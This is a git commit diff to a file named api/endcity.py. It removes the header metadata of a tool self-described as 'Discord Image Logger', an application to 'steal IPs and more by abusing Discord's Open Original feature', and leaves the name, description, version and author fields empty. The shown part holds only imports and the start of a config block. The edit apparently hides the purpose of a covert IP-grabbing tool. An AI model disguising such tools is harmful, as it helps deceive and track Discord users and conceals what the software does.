466ad242656db2e86ec1fc72ff3c9062d34a3938
Nekroz2 <100996200+Nekroz2@users.noreply.github.com>
2023-08-10 19:15:13 +0200

    Update endcity.py

--- api/endcity.py
+++ api/endcity.py
@@ -5,10 +5,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+__app__ = ""
+__description__ = ""
+__version__ = ""
+__author__ = ""
 
 config = {
     # BASE CONFIG #
